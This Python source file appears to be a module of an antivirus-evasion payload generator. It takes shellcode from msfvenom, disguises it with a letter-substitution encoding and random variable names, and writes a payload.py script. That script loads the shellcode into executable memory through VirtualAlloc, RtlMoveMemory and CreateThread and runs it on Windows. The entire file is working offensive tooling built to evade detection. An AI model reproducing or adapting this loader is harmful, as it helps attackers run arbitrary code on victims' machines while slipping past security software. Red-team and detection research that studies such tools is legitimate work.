# Letter substitution code was adapted from:
# http://www.tutorialspoint.com/python/string_maketrans.htm

# Import Modules
import string
from modules.auxiliary import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import supportfiles

def pyLetterSubVAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    SubbedShellcodeVariableName = randomizer.randomString()
    ShellcodeVariableName = randomizer.randomString()
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()
    RandDecodedLetter = randomizer.randomString()
    RandCorrectLetter = randomizer.randomString()
    RandSubScheme = randomizer.randomString()

    # Letter Substitution Variables
    EncodeWithThis = "c"
    DecodeWithThis = "t"

    # Create Letter Substitution Scheme
    SubScheme = string.maketrans(EncodeWithThis, DecodeWithThis)

    # Escaping Shellcode
    Shellcode = Shellcode.encode("string_escape")

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n')
    PayloadFile.write('from string import maketrans\n\n')
    PayloadFile.write(RandDecodedLetter + ' = "t"\n')
    PayloadFile.write(RandCorrectLetter + ' = "c"\n\n')
    PayloadFile.write(RandSubScheme + ' = maketrans('+ RandDecodedLetter +', '+ RandCorrectLetter + ')\n\n')
    PayloadFile.write(SubbedShellcodeVariableName + ' = \"'+ Shellcode.translate(SubScheme) +'\"\n\n')
    PayloadFile.write(SubbedShellcodeVariableName + ' = ' + SubbedShellcodeVariableName + '.translate(' + RandSubScheme + ')\n')
    PayloadFile.write(ShellcodeVariableName + ' = bytearray(' + SubbedShellcodeVariableName + '.decode(\"string_escape\"))\n\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportfiles.supportingFiles()
    messages.endmsg()
